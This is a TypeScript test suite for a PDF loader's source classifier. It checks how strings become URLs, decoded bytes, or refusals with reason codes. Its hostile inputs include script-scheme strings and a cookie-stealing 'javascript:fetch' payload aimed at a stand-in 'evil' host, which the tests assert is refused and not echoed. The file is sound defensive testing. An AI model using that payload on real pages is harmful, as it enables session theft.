/*
 * FR-38: the source heuristic, asked out loud. Also the regression guard for FR-01's classification clause,
 * which is the same rule seen from the other side: what a string must be refused for, and why.
 *
 * A host holding a string from an upload widget, a query parameter or a JSON payload has to decide what it
 * is before anything is fetched, and the only honest way to let it do that is for the question it asks to
 * be answered by the same code the loader runs. So the central assertions here are not the individual
 * classifications — they are that `classifySource` and `normalizeSource` cannot disagree: the refused
 * inputs throw the very sentence the classifier returned, the byte inputs load exactly the bytes the
 * classifier decoded, and the URL inputs load as that URL. One heuristic, two entry points to it.
 *
 * `never throws` is the other half of the contract: this is a prediction a host runs on unvalidated user
 * input, and a classifier that throws is a classifier the host has to wrap in a try/catch — at which point
 * it may as well call the loader and catch that.
 */
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { isPdfError, PdfError } from './errors';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import {
  base64ToBytes,
  classifySource,
  normalizeSource,
  type PdfSourceClassification,
  resolveSourceUrl,
} from './source';

/** Long enough to clear the base64 threshold, and a multiple of 4. */
const BASE64_PDF = readFileSync(join(process.cwd(), 'playground', 'fixtures', 'outline-sample.pdf'))
  .toString('base64')
  .replace(/\s/g, '');

/** Just under the line: 124 characters, a multiple of 4, pure alphabet, and no path in it. */
const BASE64_TOO_SHORT = 'A'.repeat(124);

const BASE = 'https://app.example/reports/index.html';

/**
 * A page to resolve a relative address against.
 *
 * These tests run in the node project, which has no `document`, and FR-01 makes that load-bearing: a relative
 * source with no base is refused rather than guessed. So the classifications of relative addresses install a
 * base — the environment they describe — and the base-less answer is asserted on its own further down.
 */
function withDocumentBase() {
  beforeEach(() => {
    Reflect.set(globalThis, 'document', { baseURI: BASE });
  });
  afterEach(() => {
    Reflect.deleteProperty(globalThis, 'document');
  });
}

describe('classifySource — what a string is', () => {
  withDocumentBase();

  it.each([
    'https://files.example.com/contract.pdf',
    'http://localhost:8000/a.pdf',
    'blob:https://app.example.com/6f0d0e2e-0b8d-4a1e-9b0f-1f2e3d4c5b6a',
    'file:///srv/docs/a.pdf',
    '/files/report.pdf',
    './relative/report.pdf',
    '../up-one.pdf',
    '//cdn.example.com/a.pdf',
    'report.pdf',
    'reports/2026/annual',
    'a.pdf?version=4#page=2',
  ])('calls %s a url', (src) => {
    expect(classifySource(src)).toEqual({ kind: 'url', url: src });
  });

  it('decodes a long base64 string to the file’s own bytes', () => {
    const classified = classifySource(BASE64_PDF);
    expect(classified.kind).toBe('bytes');
    if (classified.kind !== 'bytes') return;
    expect(classified.data.subarray(0, 5)).toEqual(Uint8Array.from([0x25, 0x50, 0x44, 0x46, 0x2d]));
    expect(classified.data.length).toBe(Buffer.from(BASE64_PDF, 'base64').length);
  });

  it('decodes a base64 data URL, because that is what the loader does with it', () => {
    const classified = classifySource(`data:application/pdf;base64,${BASE64_PDF}`);
    expect(classified.kind).toBe('bytes');
  });

  it('leaves a data URL that carries text rather than base64 a url', () => {
    // The carve-out in one sentence: `;base64` is the form that is bytes-in-a-string; anything else is a
    // URL the engine is handed and fetches, and saying so here is what keeps the two functions honest.
    expect(classifySource('data:application/pdf,%25PDF-1.4')).toEqual({
      kind: 'url',
      url: 'data:application/pdf,%25PDF-1.4',
    });
  });

  it('trims before deciding, so a pasted value with a newline is still the same source', () => {
    expect(classifySource('  /files/report.pdf\n')).toEqual({
      kind: 'url',
      url: '/files/report.pdf',
    });
    const padded = classifySource(` ${BASE64_PDF} `);
    expect(padded.kind).toBe('bytes');
  });
});

describe('classifySource — why a string is not a source', () => {
  it('names a bare word, which is the typo that used to fetch the app’s own error page', () => {
    const classified = classifySource('report');
    expect(classified.kind).toBe('refused');
    if (classified.kind !== 'refused') return;
    expect(classified.reason).toBe('bare-name');
    expect(classified.message).toContain('Unrecognized PDF source "report"');
  });

  it('names a backslash, because a Windows path is not a web path', () => {
    const classified = classifySource('C:\\Users\\me\\report.pdf');
    if (classified.kind !== 'refused') throw new Error('expected a refusal');
    expect(classified.reason).toBe('windows-path');
  });

  it.each(['', '   ', '\n\t'])('names an empty value %j', (src) => {
    const classified = classifySource(src);
    if (classified.kind !== 'refused') throw new Error('expected a refusal');
    expect(classified.reason).toBe('empty');
  });

  /**
   * The one input that could have made the classifier throw, and the reason it does not: a `data:` URL
   * announces base64 and then carries something else — truncated in transit, or a `+` that a form turned
   * into a space. Decoding it is `atob`'s problem, which is a `DOMException`, escaping out of a function
   * whose entire contract is that a host never has to wrap it.
   */
  it.each([
    'data:application/pdf;base64,!!!not base64!!!',
    'data:application/pdf;base64,JVBERi0', // the right alphabet, a length that is not a multiple of 4
    'data:application/pdf;base64,',
  ])('names a data URL whose body is not base64: %j', (src) => {
    const classified = classifySource(src);
    if (classified.kind !== 'refused') throw new Error('expected a refusal, not a throw');
    expect(classified.reason).toBe('bad-base64');
    expect(classified.message).toContain('a data URL that says base64 must carry base64');
  });

  /**
   * The counterfactual that makes the 128-character line a decision rather than a mystery: the same
   * alphabet, four characters shorter, is refused instead of guessed. Shorter still would be a filename
   * or a fragment of prose, and the loader cannot tell those apart from a document either.
   */
  it('refuses base64 that is just under the threshold rather than guessing it is a document', () => {
    const classified = classifySource(BASE64_TOO_SHORT);
    if (classified.kind !== 'refused') throw new Error('expected a refusal');
    expect(classified.kind).toBe('refused');
    expect(classified.reason).toBe('bare-name');
    expect(BASE64_TOO_SHORT).toHaveLength(124);
  });

  it('never throws, whatever the string', () => {
    const hostile = [
      ' ',
      '///',
      '\\',
      'data:',
      'https://',
      '?q=',
      'a'.repeat(129),
      'has space and +slash/and=',
      '0000000000',
      'ünïcode.pdf',
      '\u0000report',
      'javascript:alert(1)',
      // A data URL whose body was URL-encoded: `%25` is not in the alphabet, so this is refused, not thrown.
      'data:application/pdf;base64,%25PDF',
      // Exactly on the line, and holding the alphabet's non-alphanumeric `+`: this one is bytes.
      `${'A'.repeat(64)}+${'B'.repeat(63)}`,
      'A'.repeat(128),
    ];
    const kinds = new Set<PdfSourceClassification['kind']>();
    for (const src of hostile) {
      const classified = classifySource(src);
      kinds.add(classified.kind);
    }
    // Nothing escaped as an exception, and every answer is one of the three the type allows.
    expect([...kinds].sort()).toEqual(['bytes', 'refused', 'url']);
  });

  it.each([
    'javascript:alert(1)',
    'livescript:x',
    'vbscript:msgbox(1)',
    'view-source:https://example.com/a.pdf',
    'about:blank',
    'chrome://settings',
    'chrome-extension://abcdefghijklmnop/content.pdf',
    'moz-extension://uuid/a.pdf',
    'resource://pdf.js/a.pdf',
  ])('refuses the %j scheme by name', (src) => {
    // The clause is "unsupported schemes are refused with a stable reason code", and "by name" is the point:
    // before this rule `javascript:alert(1)` was refused only because it happens to have no slash, and
    // `chrome://settings` classified as a url because a scheme with slashes looked like a path. Both answers
    // were accidents, and an accident does not survive the next scheme someone pastes in.
    const classified = classifySource(src);
    if (classified.kind !== 'refused') throw new Error(`expected a refusal, got ${classified.kind}`);
    expect(classified.reason).toBe('unsupported-scheme');
    expect(classified.message).toMatch(/cannot name a document to fetch/);
  });

  it('refuses a script scheme without echoing its payload', () => {
    // The message is documented as safe to show and to log, and a `javascript:` string is script text: the
    // subject names the scheme, and nothing after the colon is repeated.
    const hostile = 'javascript:fetch("//evil/" + document.cookie)';
    const classified = classifySource(hostile);
    if (classified.kind !== 'refused') throw new Error('expected a refusal');
    expect(classified.message).toContain('the javascript: scheme');
    expect(classified.message).not.toContain('cookie');
  });

  it('still accepts a custom scheme that a host registered itself', () => {
    // A named list of refusals, not an allowlist of every scheme: `my-app://documents/a.pdf` is how a desktop
    // shell hands a document to a webview, and refusing it would make the rule worse than the hole it closes.
    expect(classifySource('my-app://documents/a.pdf')).toEqual({
      kind: 'url',
      url: 'my-app://documents/a.pdf',
    });
  });

  it('refuses a relative address when there is no document base to resolve it against', () => {
    // The other half of FR-01's sentence: "Relative URLs resolve against the document base URL in a browser
    // and are refused when no base URL exists." These run with no base installed — Node, a worker, a server
    // render — and the answer must be a reason code, not a fetch against an origin nobody named.
    for (const src of [
      '/files/report.pdf',
      './relative/report.pdf',
      '../up-one.pdf',
      '//cdn.example.com/a.pdf',
      'documents/report.pdf',
      'report.pdf',
    ]) {
      const classified = classifySource(src);
      if (classified.kind !== 'refused') throw new Error(`expected a refusal for ${src}`);
      expect(classified.reason).toBe('no-base-url');
      expect(classified.message).toMatch(/no document base URL/);
    }
  });

  it('resolves a relative address against the base when one exists', () => {
    // The counterfactual pair: same strings, page present, and the answer flips to `url` — which is what
    // makes the refusal above a statement about the environment rather than about the string.
    Reflect.set(globalThis, 'document', { baseURI: BASE });
    try {
      expect(classifySource('/files/report.pdf')).toEqual({ kind: 'url', url: '/files/report.pdf' });
      expect(resolveSourceUrl('./relative/report.pdf')).toBe('https://app.example/reports/relative/report.pdf');
      expect(resolveSourceUrl('report.pdf')).toBe('https://app.example/reports/report.pdf');
    } finally {
      Reflect.deleteProperty(globalThis, 'document');
    }
  });

  it('refuses a `javascript:` scheme rather than treating it as a URL', () => {
    // Kept as its own case because it is the one a reader of the security notes will look for: the refusal is
    // now by name, so it does not depend on the string happening to lack a slash.
    const classified = classifySource('javascript:alert(1)');
    expect(classified.kind).toBe('refused');
    if (classified.kind !== 'refused') throw new Error('expected a refusal');
    expect(classified.reason).toBe('unsupported-scheme');
  });
});

describe('base64ToBytes', () => {
  it('decodes the same bytes the classifier reports for the same string', () => {
    const classified = classifySource(BASE64_PDF);
    if (classified.kind !== 'bytes') throw new Error('expected bytes');
    expect(base64ToBytes(BASE64_PDF)).toEqual(classified.data);
  });

  it('tolerates the line breaks a PEM-style payload arrives with', () => {
    const oneLine = base64ToBytes(BASE64_PDF);
    const wrapped = base64ToBytes(BASE64_PDF.replace(/(.{64})/g, '$1\n'));
    expect(wrapped).toEqual(oneLine);
  });

  it('throws a PdfError that says what was wrong, not a DOMException about characters', () => {
    expect(() => base64ToBytes('')).toThrow(PdfError);
    expect(() => base64ToBytes('not base64 !!!')).toThrow(/not a base64 string/);
    expect(() => base64ToBytes('AAAA')).not.toThrow();
    // A length that is not a multiple of 4 is the other way this fails in the wild, and `atob` reports it
    // as a malformed character rather than as the padding problem it is.
    expect(() => base64ToBytes(`${BASE64_PDF}A`)).toThrow(/not a base64 string/);
    // FR-54: the code is the part a host switches on, so a bad input arrives as INVALID_SOURCE and not
    // as "some unknown thing went wrong".
    const thrown: unknown = (() => {
      try {
        base64ToBytes('');
        return null;
      } catch (error) {
        return error;
      }
    })();
    expect(isPdfError(thrown, 'INVALID_SOURCE')).toBe(true);
  });
});

describe('the classifier and the loader are the same rule', () => {
  withDocumentBase();

  // Labelled so the long base64 case does not become a 30 kB test title.
  const inputs: { label: string; src: string }[] = [
    { label: 'a path', src: '/files/report.pdf' },
    { label: 'an absolute url', src: 'https://files.example.com/contract.pdf' },
    { label: 'a bare word', src: 'report' },
    { label: 'a windows path', src: 'C:\\Users\\me\\report.pdf' },
    { label: 'an empty string', src: '' },
    { label: 'a refused scheme', src: 'chrome://settings' },
    { label: 'a base64 document', src: BASE64_PDF },
    { label: 'a base64 data url', src: `data:application/pdf;base64,${BASE64_PDF}` },
    { label: 'base64 just under the line', src: BASE64_TOO_SHORT },
    { label: 'a URL-encoded data url', src: 'data:application/pdf;base64,%25PDF' },
  ];

  it.each(inputs)('loads $label exactly as it was classified', async ({ src }) => {
    const classified = classifySource(src);
    if (classified.kind === 'refused') {
      // Same type, same words: a host that checked first and a host that only passed `src` through are
      // told the same thing — and the thing they are told carries a code, not just a sentence (FR-54).
      const error = await normalizeSource(src).catch((err: unknown) => err);
      expect(isPdfError(error, 'INVALID_SOURCE')).toBe(true);
      expect((error as Error).message).toBe(classified.message);
      return;
    }
    const loaded = await normalizeSource(src);
    if (classified.kind === 'bytes') {
      expect(loaded).toEqual({ kind: 'data', data: classified.data });
      return;
    }
    expect(loaded).toEqual({ kind: 'url', url: classified.url });
  });

  it('agrees about a relative source with no base, which is the refusal a server render will actually meet', async () => {
    // The one refusal that depends on the environment rather than the string, so the pair is asserted with the
    // page taken away: a host that checked first and a host that only rendered must read the same sentence.
    Reflect.deleteProperty(globalThis, 'document');
    try {
      const classified = classifySource('/files/report.pdf');
      if (classified.kind !== 'refused') throw new Error('expected a refusal');
      const error = await normalizeSource('/files/report.pdf').catch((err: unknown) => err);
      expect(isPdfError(error, 'INVALID_SOURCE')).toBe(true);
      expect((error as Error).message).toBe(classified.message);
      expect(classified.message).toMatch(/no document base URL/);
    } finally {
      Reflect.set(globalThis, 'document', { baseURI: BASE });
    }
  });

  it('still applies allowedSources to a url and never to bytes', async () => {
    await expect(
      normalizeSource('https://evil.example/a.pdf', { allowedSources: ['/files/'] }),
    ).rejects.toThrow(/allowedSources/);
    // The classifier is the gate's front door: a host that refuses on `url` before calling has not
    // changed what the loader will do.
    expect(classifySource('https://evil.example/a.pdf').kind).toBe('url');
    const bytes = await normalizeSource(BASE64_PDF, { allowedSources: [] });
    expect(bytes.kind).toBe('data');
  });
});
